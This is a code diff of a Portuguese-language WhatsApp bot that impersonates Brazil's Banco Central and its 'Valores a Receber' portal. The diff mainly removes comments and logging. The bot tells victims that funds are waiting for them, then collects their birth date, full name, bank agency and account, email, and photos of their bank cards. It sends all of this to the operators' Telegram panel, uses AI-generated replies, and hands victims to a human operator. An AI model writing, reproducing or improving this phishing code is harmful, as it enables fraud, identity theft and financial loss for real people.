@@ -577,18 +577,10 @@ client.on('message_create', async (msg) => {
         return;
     }
 
-    // --- ADMIN DIGITA MANUALMENTE → ASSUME ATENDIMENTO ---
-    // Se o bot ou admin enviou uma mensagem, mas NÃO foi via sendBotMessage,
-    // significa que o Admin interveio manualmente no WhatsApp.
-    // Agora permite assumir tanto em modo 'bot' quanto 'waiting'.
     if (!currentSession || (currentSession.mode !== 'bot' && currentSession.mode !== 'waiting') || internalMessageChats.has(targetChatId)) return;
 
-    // Removido o delay de 30s (sessionAge) para permitir que o admin assuma imediatamente.
-    console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);
-
-    // Preserva dados do lead ao assumir
     const updatedSession = {
-        ...currentSession, // Preserva tgMsgId, userId, expectedData, etc.
+        ...currentSession, 
         mode: 'human',
         humanStep: 1,
         name: currentSession.name || null,
@@ -612,23 +604,14 @@ client.on('message_create', async (msg) => {
     }, 1000);
 });
 
-// =============================================================
-// HANDLER 2: 'message' — SOMENTE mensagens RECEBIDAS (incoming).
-// Este evento NÃO dispara para mensagens que o bot envia,
-// eliminando o risco de processar a própria resposta.
-// =============================================================
 client.on('message', async (msg) => {
     if (BOT_ID !== 'main') return;
-    if (msg.fromMe) return; // Segurança extra para não processar mensagens enviadas (loop)
+    if (msg.fromMe) return;
 
-    // msg.from = sempre o remetente (o lead). Nunca é o bot.
     const targetChatId = msg.from;
     if (!targetChatId) return;
-
-    // Ignora mensagens de grupos (apenas individuais)
     if (targetChatId.includes('@g.us')) return;
 
-    // LOCK: se já estamos processando uma mensagem deste lead, ignorar
     if (processingLock.has(targetChatId)) {
         console.log(`⏳ [LOCK] Mensagem de ${targetChatId} ignorada — já processando.`);
         return;
@@ -640,99 +623,27 @@ client.on('message', async (msg) => {
     } catch (e) {
         console.error(`❌ [ERRO] Falha ao processar mensagem de ${targetChatId}:`, e.message);
     } finally {
-        // Libera o lock após 2s para evitar spam mas permitir próximas mensagens
         setTimeout(() => processingLock.delete(targetChatId), 2000);
     }
 });
 
-// =============================================================
-// FUNÇÃO PRINCIPAL DE PROCESSAMENTO DE MENSAGEM RECEBIDA
-// Centraliza toda a lógica para evitar duplicação e facilitar
-// a depuração do fluxo de cada lead individualmente.
-// =============================================================
 async function processIncomingMessage(msg, targetChatId) {
     const text = (msg.body || "").trim();
     const isTrigger = text.toUpperCase().includes('SOLICITAÇÃO DE RESGATE');
 
-    // Registra o último lead que enviou mensagem (para o comando /pix)
     fs.writeFileSync('last-lead.json', JSON.stringify({ chatId: targetChatId, timestamp: Date.now() }));
 
     const currentSession = chatSessions.get(targetChatId);
-    console.log(`📩 [MSG] De: ${targetChatId} | Modo: ${currentSession?.mode || 'NOVO'} | Step: ${currentSession?.step || 'N/A'} | Texto: "${text.substring(0, 60)}"`);
-
-    // --- LEAD NA FILA DE ESPERA ---
-    if (currentSession && currentSession.mode === 'waiting') {
-        const pos = getQueuePosition(targetChatId);
-        const chat = await msg.getChat();
-        await chat.sendStateTyping();
-
-        const aiReply = await askAI(PROMPT_FILA, text);
-        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
-        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\n` +
-            `Prezado(a) titular,\n\n` +
-            `Seus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\n` +
-            `O processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\n` +
-            `Agradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;
-
-        await sendBotMessage(targetChatId, aiReply || fallback);
-        return;
-    }
-
-    // --- LEAD EM ATENDIMENTO HUMANO — bot silencioso (EXCETO ETAPA 5) ---
-    if (currentSession && currentSession.mode === 'human') {
-        if (currentSession.humanStep === 5) {
-            // Se o lead enviar mídia (foto do cartão)
-            if (msg.hasMedia) {
-                console.log(`📸 [BANCO] Lead ${targetChatId} enviou mídia.`);
-                try {
-                    const media = await msg.downloadMedia();
-                    if (media) {
-                        const buffer = Buffer.from(media.data, 'base64');
-                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
-                    }
-                } catch (e) {
-                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
-                }
-
-                await sendBotMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
-                return;
-            }
-
-            // Tenta identificar Agência e Conta no texto
-            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
-            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
-
-            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
-                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
-                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
-
-                console.log(`🏦 [BANCO] Dados de ${targetChatId}: Ag ${ag} | Cc ${cc}`);
-                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
-
-                await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
-                return;
-            }
-        }
-
-        console.log(`🤫 [HUMANO] Lead ${targetChatId} em atendimento manual. Bot silencioso.`);
-        return;
-    }
-
-    // 1. GATILHO INICIAL (vindo do site)
+    
     if (isTrigger) {
         if (currentSession && currentSession.mode === 'bot' && currentSession.step > 0) return;
 
         const protocolMatch = text.match(/Protocolo: \*#SVR-(.*?)\*/i);
         const userId = protocolMatch ? protocolMatch[1].toLowerCase() : null;
-
-        // Detecta o tipo de documento (CPF ou CNPJ) enviado pelo site
         const docTypeMatch = text.match(/Tipo de Documento: \*(CPF|CNPJ)\*/i);
         const docType = docTypeMatch ? docTypeMatch[1].toUpperCase() : 'CPF';
         const isPJ = docType === 'CNPJ';
-        console.log(`📄 [DOC] Tipo detectado: ${docType} para ${targetChatId}`);
-
-        console.log(`🚀 [SVR] Atendimento Iniciado: ${targetChatId}`);
-
+        
         let expectedData = null;
         if (userId) {
             try {
@@ -741,12 +652,9 @@ async function processIncomingMessage(msg, targetChatId) {
                     timeout: 5000
                 });
                 expectedData = res.data;
-            } catch (e) {
-                console.log(`⚠️ [AVISO] Dados do portal não encontrados para ${userId}. Usando modo de validação aberta.`);
-            }
+            } catch (e) { }
         }
 
-        // Envia mensagem inicial no Telegram (painel de cadastro)
         const { text: txtInit, reply_markup } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data', docType);
         const tgMsgId = await notifyTelegram(txtInit, null, reply_markup);
 
@@ -755,7 +663,7 @@ async function processIncomingMessage(msg, targetChatId) {
             step: 1,
             userId,
             expectedData,
-            docType,   // 'CPF' ou 'CNPJ'
+            docType,
             lastMsgTime: Date.now(),
             createdAt: Date.now(),
             tgMsgId
@@ -774,20 +682,56 @@ async function processIncomingMessage(msg, targetChatId) {
         return;
     }
 
-    // 2. LEAD SEM SESSÃO ATIVA — IA ASSUME E INICIA FLUXO
-    if (!currentSession || currentSession.mode !== 'bot') {
-        console.log(`🤖 [IA] Mensagem espontânea de ${targetChatId}: "${text}"`);
+    if (currentSession && currentSession.mode === 'waiting') {
+        const pos = getQueuePosition(targetChatId);
         const chat = await msg.getChat();
         await chat.sendStateTyping();
 
-        // Envia painel de cadastro no Telegram
+        const aiReply = await askAI(PROMPT_FILA, text);
+        const posText = pos ? `\n\n📌 *Sua posição atual na fila:* ${pos}º lugar.` : '';
+        const fallback = `📋 *Portal SVR — Sistema de Valores a Receber*\n\nPrezado(a) titular,\n\nSeus dados foram validados com êxito e seu processo de liberação de ativos foi encaminhado ao setor responsável do Banco Central do Brasil, em conformidade com a Resolução nº 4.862/2020.\n\nO processamento está em andamento. Solicitamos que aguarde o contato de nosso operador responsável, que lhe informará os próximos passos de forma segura e sigilosa.${posText}\n\nAgradecemos sua compreensão.\n_Portal SVR — Banco Central do Brasil_`;
+
+        await sendBotMessage(targetChatId, aiReply || fallback);
+        return;
+    }
+
+    if (currentSession && currentSession.mode === 'human') {
+        if (currentSession.humanStep === 5) {
+            if (msg.hasMedia) {
+                try {
+                    const media = await msg.downloadMedia();
+                    if (media) {
+                        const buffer = Buffer.from(media.data, 'base64');
+                        await notifyTelegramPhoto(buffer, `🔐 <b>DOCUMENTO SIGILOSO RECEBIDO</b>\nLead: <code>${targetChatId}</code>\n<i>O lead enviou um anexo (Cartão/Doc) para validação da Etapa 5.</i>`);
+                    }
+                } catch (e) {
+                    await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
+                }
+                await sendBotMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
+                return;
+            }
+
+            const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
+            const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
+
+            if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
+                const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
+                const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
+                await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
+                await sendBotMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
+                return;
+            }
+        }
+        return;
+    }
+
+    if (!currentSession || currentSession.mode !== 'bot') {
+        const chat = await msg.getChat();
+        await chat.sendStateTyping();
+
         const { text: txtEsp, reply_markup: rmEsp } = buildCadastroMessage(targetChatId, null, null, 'preenchendo_data');
         const tgMsgId = await notifyTelegram(txtEsp, null, rmEsp);
-
-        // Notifica contato espontâneo
-        await notifyTelegram(
-            `📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`
-        );
+        await notifyTelegram(`📩 <b>NOVO CONTATO ESPONTÂNEO</b>\nLead: <code>${targetChatId}</code>\nMensagem: <i>${text}</i>`);
 
         chatSessions.set(targetChatId, {
             mode: 'bot',
@@ -801,10 +745,7 @@ async function processIncomingMessage(msg, targetChatId) {
         saveSessions();
 
         const aiReply = await askAI(PROMPT_INICIAL, text);
-        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\n` +
-            `Identificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\n` +
-            `Para prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n` +
-            `📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
+        const fallback = `👋 *Olá! Sou o Assistente Oficial do Portal SVR — Sistema de Valores a Receber.*\n\nIdentificamos valores pendentes de liberação associados ao seu perfil em nosso sistema, em conformidade com as diretrizes do Banco Central do Brasil.\n\nPara prosseguir com a validação de titularidade e liberar o processamento, necessitamos confirmar seus dados cadastrais.\n\n📍 *ETAPA 1:* Por gentileza, informe sua *Data de Nascimento* (Ex: 10/05/1990):`;
 
         setTimeout(async () => {
             await sendBotMessage(targetChatId, aiReply || fallback);
@@ -813,17 +754,12 @@ async function processIncomingMessage(msg, targetChatId) {
     }
 
     currentSession.lastMsgTime = Date.now();
-    console.log(`📩 [LEAD] ${targetChatId}: "${text}"`);
-
     const chat = await msg.getChat();
     await chat.sendStateTyping();
-
     const isPJ = currentSession.docType === 'CNPJ';
 
-    // --- ETAPA 1: DATA (nascimento para PF / abertura para PJ) ---
     if (currentSession.step === 1) {
         const dateMatch = text.match(/(\d{1,2})[\/-](\d{1,2})[\/-](\d{4}|\d{2})/);
-
         if (!dateMatch) {
             const aiReply = await askAI(PROMPT_DATA_INVALIDA, text);
             const dataLabel = isPJ ? 'Data de Abertura da empresa' : 'Data de Nascimento';
@@ -833,79 +769,56 @@ async function processIncomingMessage(msg, targetChatId) {
         }
 
         const typedDate = text.trim();
-
         if (currentSession.expectedData?.birthDate) {
             const cleanTyped = typedDate.replace(/\D/g, "");
             const cleanExpected = currentSession.expectedData.birthDate.replace(/\D/g, "");
-
             if (cleanTyped !== cleanExpected) {
-                const fallback = `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`;
-                await sendBotMessage(targetChatId, fallback);
+                await sendBotMessage(targetChatId, `⚠️ *DIVERGÊNCIA IDENTIFICADA — Portal SVR*\n\nA data informada não corresponde aos registros cadastrais do titular.\n\nPor gentileza, verifique os dados e informe novamente.\n📌 *Formato:* DD/MM/AAAA`);
                 return;
             }
         }
 
-        // Data aceita — avançar para etapa 2 (Nome)
         currentSession.step = 2;
         currentSession.birthDate = typedDate;
         chatSessions.set(targetChatId, currentSession);
         saveSessions();
 
-        // Atualiza o painel no Telegram
         if (currentSession.tgMsgId) {
             const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, null, typedDate, 'preenchendo_nome', currentSession.docType);
             await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
         }
 
         if (isPJ) {
-            await sendBotMessage(targetChatId,
-                `✅ *Data de abertura confirmada!*\n\n` +
-                `📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
+            await sendBotMessage(targetChatId, `✅ *Data de abertura confirmada!*\n\n📍 *FASE 1.2:* Agora informe a *Razão Social* da empresa (conforme consta no Cartão CNPJ):`);
         } else {
-            await sendBotMessage(targetChatId,
-                `✅ *Data de nascimento confirmada!*\n\n` +
-                `📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
+            await sendBotMessage(targetChatId, `✅ *Data de nascimento confirmada!*\n\n📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
         }
 
-        // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
     } else if (currentSession.step === 2) {
         const typedName = text.trim();
-
         if (typedName.length >= 8 && typedName.includes(" ")) {
             if (currentSession.expectedData?.fullName) {
                 const portalName = currentSession.expectedData.fullName.toLowerCase();
                 const firstName = typedName.toLowerCase().split(' ')[0];
                 if (!portalName.includes(firstName)) {
-                    await sendBotMessage(targetChatId,
-                        `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
+                    await sendBotMessage(targetChatId, `⚠️ *ALERTA DE SEGURANÇA — Portal SVR*\n\nO nome informado não corresponde ao titular cadastrado no sistema.\n\nPor gentileza, informe seu *Nome Completo* conforme consta em documento oficial:`);
                     return;
                 }
             }
-
-            // ✅ Nome aceito — avançar para fase 1.3 (Dados Bancários)
             currentSession.step = 3;
             currentSession.name = typedName;
             chatSessions.set(targetChatId, currentSession);
             saveSessions();
 
-            await sendBotMessage(targetChatId,
-                `✅ *Nome confirmado!*\n\n` +
-                `📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n` +
-                `📌 *Exemplo:* Agência 0001 - Conta 12345-6`);
-
+            await sendBotMessage(targetChatId, `✅ *Nome confirmado!*\n\n📍 *FASE 1.3:* Para concluir a autenticação de identidade, informe os *Dados Bancários* (Agência e Conta) onde deseja receber os ativos. O sistema validará se o vínculo pertence ao titular.\n\n📌 *Exemplo:* Agência 0001 - Conta 12345-6`);
         } else {
-            // Nome inválido — IA responde de forma formal
             const aiReply = await askAI(PROMPT_NOME_INVALIDO, text);
             const fallback = `⚠️ *Portal SVR — Validação de Identidade*\n\nPor gentileza, informe seu *Nome Completo* sem abreviações, conforme consta em seu documento oficial.`;
             await sendBotMessage(targetChatId, aiReply || fallback);
         }
-
-        // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
     } else if (currentSession.step === 3) {
-        // Se o lead já enviou os dados e estamos aguardando o "SIM" de confirmação
         if (currentSession.awaitingConfirm) {
             if (text.toUpperCase() === 'SIM' || text.toUpperCase().includes('CORRETO') || text.toUpperCase().includes('ESTA')) {
-                // ✅ Confirmado — avançar para Etapa 4 (E-mail)
                 currentSession.step = 4;
                 delete currentSession.awaitingConfirm;
                 chatSessions.set(targetChatId, currentSession);
@@ -917,13 +830,11 @@ async function processIncomingMessage(msg, targetChatId) {
                     `📌 *Exemplo:* seuemail@provedor.com`);
                 return;
             } else {
-                // Se não confirmou (quer trocar), limpa o flag e deixa o fluxo seguir para ler os novos dados abaixo
                 delete currentSession.awaitingConfirm;
             }
         }
 
         if (msg.hasMedia) {
-            console.log(`📸 [BANCO-FOTO] Lead ${targetChatId} enviou foto do cartão.`);
             try {
                 const media = await msg.downloadMedia();
                 if (media) {
@@ -938,10 +849,7 @@ async function processIncomingMessage(msg, targetChatId) {
             saveSessions();
 
             await sendBotMessage(targetChatId,
-                `✅ *Documento recebido com sucesso!*\n\n` +
-                `Prezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n` +
-                `⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n` +
-                `*Responda SIM para confirmar.*`);
+                `✅ *Documento recebido com sucesso!*\n\nPrezado(a) titular, esta é a conta que o senhor(a) deseja utilizar para o recebimento dos valores ativos?\n\n⚠️ *Nota:* Devido aos protocolos de segurança, a validação de imagens é realizada por supervisão judicial e técnica do sistema SVR/BCB para garantir a integridade do repasse.\n\n*Responda SIM para confirmar.*`);
             return;
         }
 
@@ -949,8 +857,6 @@ async function processIncomingMessage(msg, targetChatId) {
         if (typedBank.length >= 4) {
             const bank = detectBank(typedBank);
             const bankName = bank ? bank.name : "Instituição Identificada";
-
-            // Tenta extrair Agência e Conta
             const agMatch = typedBank.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
             const ccMatch = typedBank.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
             const ag = agMatch ? agMatch[1] : (typedBank.split(/[-\s]/).find(p => p.length >= 3 && p.length <= 5) || "Pendente");
@@ -963,18 +869,11 @@ async function processIncomingMessage(msg, targetChatId) {
 
             await sendBotMessage(targetChatId,
                 `🏛️ *${bankName.toUpperCase()} IDENTIFICADO* ✅\n\n` +
-                `📍 *DADOS CAPTURADOS:*
-                - Agência: ${ag}
-                - Conta: ${cc}
-                - Instituição: ${bankName}\n\n` +
-                `Prezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n` +
-                `⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n` +
-                `*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
+                `📍 *DADOS CAPTURADOS:*\n- Agência: ${ag}\n- Conta: ${cc}\n- Instituição: ${bankName}\n\nPrezado(a) titular, confirme se realmente esta é a conta que o senhor(a) deseja utilizar para o recebimento do seu valor ativo?\n\n⚠️ *AVISO:* A conta *NÃO* pode ser recém-criada ou sem movimentações antigas, sob risco de bloqueio pelo sistema de segurança do Banco Central.\n\n*Responda SIM para confirmar* ou informe os dados novamente para trocar.`);
         } else {
             await sendBotMessage(targetChatId, `⚠️ *Dados Bancários Inválidos*\n\nPor gentileza, informe sua Agência e Conta corretamente para vinculação do resgate.`);
         }
 
-        // --- ETAPA 1.4: CONFIRMAÇÃO DE E-MAIL ---
     } else if (currentSession.step === 4) {
         const typedEmail = text.toLowerCase().trim();
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
